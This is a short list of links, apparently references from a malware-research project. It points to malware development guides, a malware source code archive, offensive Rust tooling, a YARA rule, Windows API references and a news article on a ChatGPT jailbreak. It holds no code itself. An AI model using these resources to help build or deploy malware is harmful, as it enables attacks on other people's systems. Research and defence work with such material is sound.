- [Malware Development Resources](https://github.com/malsearchs/Pure-Malware-Development)
- [Malware Behavior Catalog](https://github.com/MBCProject/mbc-markdown/blob/main/)
- [vxunderground MalwareSourceCode](https://github.com/vxunderground/MalwareSourceCode)
- [Yara Rule](https://github.com/Yara-Rules/rules/blob/master/malware/RANSOM_Petya.yar)
- [Microsoft documention on the messageboxw systemcall](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw)
- [Windows api mapped out like lolbas](https://malapi.io/)
- [Bleeping computer Link for Time bandit](https://www.bleepingcomputer.com/news/security/time-bandit-chatgpt-jailbreak-bypasses-safeguards-on-sensitive-topics/)
- [Offensives Rust](https://github.com/trickster0/OffensiveRust)
